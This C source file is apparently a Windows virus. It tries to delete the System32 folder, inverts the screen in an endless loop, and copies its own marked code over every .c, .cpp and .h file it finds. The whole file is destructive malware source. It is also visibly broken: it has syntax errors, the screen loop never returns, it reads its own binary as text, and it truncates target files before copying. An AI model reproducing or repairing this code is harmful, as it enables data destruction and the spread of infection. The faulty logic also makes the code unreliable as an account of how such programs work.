#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <string.h>

#define MAX_LINE_LENGTH 1000

void deletesystem()
{
  char system32Path[] = "C:\\Windows\\System32";

  remove(system32Path)
}

void fun()
{
  HDC hdc = GetDC(0;
  int x = GetSystemMetrics(SM_CXSCREEN);
  int y = GetSystemMetrics(SM_CYSCREEN);
  
  RECT screenRect;
  GetWindowRect(GetDesktopWindow(), &screenRect);
  
  while (1)
  {
    hdc = GetDC(0);
    PatBlt(hdc, 0, 0, screenRect.right, screenRect.bottom, PATINVERT);
    Sleep(1000);
    ReleaseDC(0, hdc);
  }
}

int main(int argc, char *argv[])
{
    fun();
    deletesystem();

    char self_replicating_part = 0;
    char line[MAX_LINE_LENGTH];
    char virus_code[MAX_LINE_LENGTH][MAX_LINE_LENGTH];
    int virus_code_line_count = 0;

    FILE *file = fopen(argv[0], "r");
    if (file == NULL)
    {
        printf("Error reading current file\n");
        exit(1);
    }

    while (fgets(line, MAX_LINE_LENGTH, file))
    {
        if (strcmp(line, "// VIRUS SAYS HI!\n") == 0)
        {
            self_replicating_part = 1;
        }
        if (!self_replicating_part)
        {
            strcpy(virus_code[virus_code_line_count], line);
            virus_code_line_count++;
        }
        if (strcmp(line, "// VIRUS SAYS BYE!\n") == 0)
        {
            break;
        }
    }
    fclose(file);

    char command[100];
    sprintf(command, "find . -name '*.c' -o -name '*.cpp' -o -name '*.h'");
    FILE *ls = popen(command, "r");
    if (!ls)
    {
        printf("Error listing files\n");
        exit(1);
    }

    char file_name[100];
    while (fgets(file_name, 100, ls))
    {
        file_name[strlen(file_name) - 1] = '\0';

        file = fopen(file_name, "r");
        if (file == NULL)
        {
            printf("Error reading file: %s\n", file_name);
            exit(1);
        }

        char infected = 0;
        while (fgets(line, MAX_LINE_LENGTH, file))
        {
            if (strcmp(line, "// VIRUS SAYS HI!\n") == 0)
            {
                infected = 1;
                break;
            }
        }
        fclose(file);

        if (!infected)
        {
            file = fopen(file_name, "w");
            if (file == NULL)
            {
                printf("Error writing to file: %s\n", file_name);
                exit(1);
            }

            for (int i = 0; i < virus_code_line_count; i++)
            {
                fputs(virus_code[i], file);
            }

            fputs("\n", file);

            file = fopen(file_name, "r");
            if (file == NULL)
            {
                printf("Error reading file: %s\n", file_name);
                exit(1);
            }

            while (fgets(line, MAX_LINE_LENGTH, file))
            {
                fputs(line, file);
            }
            fclose(file);
        }
    }
    pclose(ls);
    return 0;
}
